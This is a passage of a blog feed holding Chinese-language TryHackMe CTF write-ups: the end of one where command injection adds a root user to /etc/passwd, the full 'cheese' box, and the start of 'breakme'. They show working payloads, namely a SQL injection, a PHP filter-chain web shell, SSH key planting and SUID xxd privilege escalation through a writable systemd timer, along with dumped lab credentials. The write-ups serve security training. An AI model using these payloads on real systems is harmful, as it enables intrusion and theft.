class="line">Hello, Welcome to the Report Form       </span><br><span class="line">This is a way to report various problems</span><br><span class="line">    Developed by                        </span><br><span class="line">        The Technical Department of U.A.</span><br><span class="line">Enter your feedback:</span><br><span class="line">&#x27;test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">It is This:</span><br><span class="line">Feedback successfully saved.</span><br><span class="line">deku@myheroacademia:~$ cat /etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deku@myheroacademia:~$ tail -n1 /etc/passwd</span><br><span class="line">test:$1$G0VpEiUX$xG8amhil.KWmevqLhCvsE1:0:0:test:/root:/bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deku@myheroacademia:~$ su test</span><br><span class="line">Password: </span><br><span class="line">root@myheroacademia:/home/deku# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@myheroacademia:~# cat root.txt</span><br><span class="line">root@myheroacademia:/opt/NewComponent# cat /root/root.txt</span><br><span class="line">__   __               _               _   _                 _____ _          </span><br><span class="line">\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ </span><br><span class="line"> \ V / _ \| | | |   / _ \ | &#x27;__/ _ \ |  \| |/ _ \ \ /\ / /   | | | &#x27;_ \ / _ \</span><br><span class="line">  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/</span><br><span class="line">  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|</span><br><span class="line">                                  _    _ </span><br><span class="line">             _   _        ___    | |  | |</span><br><span class="line">            | \ | | ___  /   |   | |__| | ___ _ __  ___</span><br><span class="line">            |  \| |/ _ \/_/| |   |  __  |/ _ \ &#x27;__|/ _ \</span><br><span class="line">            | |\  | (_)  __| |_  | |  | |  __/ |  | (_) |</span><br><span class="line">            |_| \_|\___/|______| |_|  |_|\___|_|   \___/ </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chess-ctf</title>
      <link href="/2024/11/16/chess/"/>
      <url>/2024/11/16/chess/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>居多端口<br>查看80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://10.10.129.0 </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali@kali ~/Documents/thm/cheese </span><br><span class="line">❯ whatweb http://10.10.129.0/                                                                                                   </span><br><span class="line">http://10.10.129.0/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[info@thecheeseshop.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.129.0], Script, Title[The Cheese Shop]</span><br></pre></td></tr></table></figure><p>SQLmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 10.10.129.0</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Origin: http://10.10.129.0</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://10.10.129.0/login.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r r.txt --batch</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[12:47:27] [INFO] checking if the injection point on POST parameter &#x27;username&#x27; is a false positive</span><br><span class="line">POST parameter &#x27;username&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 98 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: username (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: username=admin&#x27; AND (SELECT 3923 FROM (SELECT(SLEEP(5)))rTrs) AND &#x27;YJdf&#x27;=&#x27;YJdf&amp;password=admin</span><br><span class="line">---</span><br><span class="line">[12:47:45] [INFO] the back-end DBMS is MySQL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就是利用sqlmap 进一步 提库 提表 提列名 提数据</p><p>一种思路是等待爆破结果<br>一种思路是绕过登录<br>这里采取绕过 省时间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; OR &#x27;x&#x27;=&#x27;x&#x27;#;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.129.0/secret-script.php?file=php://filter/resource=users.html</span><br></pre></td></tr></table></figure><p>文件读取？</p><p><a href="/../assets/img/Pasted%20image%2020241116020216.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116020216.png"></a></p><p>用户名comte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comte:x:1000:1000:comte:/home/comte:/bin/bash</span><br></pre></td></tr></table></figure><p>可以利用php伪协议进行getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/synacktiv/php_filter_chain_generator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents/thm/cheese/php_filter_chain_generator]</span><br><span class="line">└─$ python php_filter_chain_generator.py --chain &#x27;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#x27; </span><br><span class="line">[+] The following gadget chain will generate the following code : &lt;?php system($_GET[&quot;cmd&quot;]);?&gt; (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4)</span><br><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241116020944.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116020944.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241116022114.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116022114.png"></a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="/../assets/img/Pasted%20image%2020241116022126.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116022126.png"></a></p><p>数据库密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@cheesectf:/var/www/html$ grep &quot;;&quot; login.php</span><br><span class="line"></span><br><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$user = &quot;comte&quot;;</span><br><span class="line">$password = &quot;VeryCheesyPassword&quot;;</span><br><span class="line">$dbname = &quot;users&quot;;</span><br><span class="line">$conn = new mysqli($servername, $user, $password, $dbname);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [users]&gt; selselect * from users;</span><br><span class="line">select * from users;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | comte    | 5b0c2e1b4fe1410e47f26feff7f4fc4c |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="userShell"><a href="#userShell" class="headerlink" title="userShell"></a>userShell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwd /home/comte</span><br><span class="line">-rw-rw-rw- 1 comte comte    0 Mar 25  2024 authorized_keys</span><br></pre></td></tr></table></figure><p>可读可写？<br>在本地机器生成公私钥对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -f id_rsa -b 4096 -C &#x27;&#x27; -N &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>把公钥写道authorized_keys文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;contents_of_id_rsa.pub&#x27; &gt; /home/comte/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>用私钥连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh comte@cheese.thm -i id_rsa</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">comte@cheesectf:~$ sudo -l</span><br><span class="line">User comte may run the following commands on cheesectf:</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl daemon-reload</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl start exploit.timer</span><br><span class="line">    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer</span><br><span class="line">comte@cheesectf:~$ id</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">comte@cheesectf:~$ sudo /bin/systemctl start exploit.timer</span><br><span class="line">Failed to start exploit.timer: Unit exploit.timer has a bad unit file setting.</span><br><span class="line">See system logs and &#x27;systemctl status exploit.timer&#x27; for details.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">comte@cheesectf:~$ ls -lah /etc/systemd/system/exploit.timer</span><br><span class="line">-rwxrwxrwx 1 root root 87 Mar 29  2024 /etc/systemd/system/exploit.timer</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可读可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">comte@cheesectf:/opt$ vim /etc/systemd/system/exploit.timer</span><br><span class="line">comte@cheesectf:/opt$ ls -la</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar 29  2024 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Sep 27  2023 ..</span><br><span class="line">comte@cheesectf:/opt$ ls -la</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar 29  2024 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Sep 27  2023 ..</span><br><span class="line">comte@cheesectf:/opt$ ls -la</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar 29  2024 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Sep 27  2023 ..</span><br><span class="line">comte@cheesectf:/opt$ ls -la</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x  2 root root 4096 Mar 29  2024 .</span><br><span class="line">drwxr-xr-x 19 root root 4096 Sep 27  2023 ..</span><br><span class="line">comte@cheesectf:/opt$ sudo /bin/systemctl daemon-reload</span><br><span class="line">comte@cheesectf:/opt$ vim /etc/systemd/system/exploit.timer</span><br><span class="line">comte@cheesectf:/opt$ sudo systemctl restart exploit.timer</span><br><span class="line">comte@cheesectf:/opt$ ls</span><br><span class="line">xxd</span><br><span class="line">comte@cheesectf:/opt$ cd xxd</span><br><span class="line">-bash: cd: xxd: Not a directory</span><br><span class="line">comte@cheesectf:/opt$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x  2 root root  4096 Nov 15 19:05 .</span><br><span class="line">drwxr-xr-x 19 root root  4096 Sep 27  2023 ..</span><br><span class="line">-rwsr-sr-x  1 root root 18712 Nov 15 19:05 xxd</span><br><span class="line">comte@cheesectf:/opt$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>让我们看看 go awayBins 看看可以用 SUID 集 <strong>xxd</strong> 二进制文件做什么。就在这里，我们可以使用它读取任何文件。由于我们只需要从 <strong>&#x2F;root&#x2F;root.txt</strong> 获取 <strong>root.txt</strong> 文件数据。我们可以直接使用它，而无需使用以下命令获得权限 root shell。</p><p><a href="/../assets/img/Pasted%20image%2020241116030714.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241116030714.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">comte@cheesectf:/opt$ LFILE=/root/root.txt</span><br><span class="line">comte@cheesectf:/opt$ /opt/xxd &quot;$LFILE&quot; | /opt/xxd -r</span><br><span class="line">      _                           _       _ _  __</span><br><span class="line">  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___</span><br><span class="line"> / __| &#x27;_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \</span><br><span class="line">| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/</span><br><span class="line"> \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">THM&#123;---&#125;</span><br><span class="line">comte@cheesectf:/opt$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> THM </tag>
            
            <tag> tryhackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>breakme</title>
      <link href="/2024/11/16/breakme/"/>
      <url>/2024/11/16/breakme/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>目标IP: 10.10.227.21<br>本机IP：10.17.5.121</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>rustscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">root@HACK:~# rustscan -a 10.10.227.21</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-<span class="string">&#x27; `-&#x27;</span>`-----<span class="string">&#x27;`----&#x27;</span>  `-<span class="string">&#x27;  `----&#x27;</span>  `---<span class="string">&#x27; `-&#x27;</span>  `-<span class="string">&#x27;`-&#x27;</span> `-<span class="string">&#x27;</span></span><br><span class="line"><span class="string">The Modern Day Port Scanner.</span></span><br><span class="line"><span class="string">________________________________________</span></span><br><span class="line"><span class="string">: http://discord.skerritt.blog         :</span></span><br><span class="line"><span class="string">: https://github.com/RustScan/RustScan :</span></span><br><span class="line"><span class="string"> --------------------------------------</span></span><br><span class="line"><span class="string">Scanning ports faster than you can say &#x27;</span>SYN ACK<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span></span><br><span class="line"><span class="string">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span></span><br><span class="line"><span class="string">[!] Your file limit is very small, which negatively impacts RustScan&#x27;</span>s speed. Use the Docker image, or up the Ulimit with <span class="string">&#x27;--ulimit 5000&#x27;</span>. </span><br><span class="line">Open 10.10.227.21:22</span><br><span class="line">Open 10.10.227.21:80</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line">[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-16 00:33 HKT</span><br><span class="line">Initiating Ping Scan at 00:33</span><br><span class="line">Scanning 10.10.227.21 [4 ports]</span><br><span class="line">Completed Ping Scan at 00:33, 0.28s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 00:33</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 00:33, 5.50s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 5.50s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]</span><br><span class="line">Initiating SYN Stealth Scan at 00:33</span><br><span class="line">Scanning 10.10.227.21 [2 ports]</span><br><span class="line">Discovered open port 22/tcp on 10.10.227.21</span><br><span class="line">Discovered open port 80/tcp on 10.10.227.21</span><br><span class="line">Completed SYN Stealth Scan at 00:33, 0.28s elapsed (2 total ports)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.227.21</span><br><span class="line">Host is up, received timestamp-reply ttl 60 (0.27s latency).</span><br><span class="line">Scanned at 2024-11-16 00:33:47 HKT <span 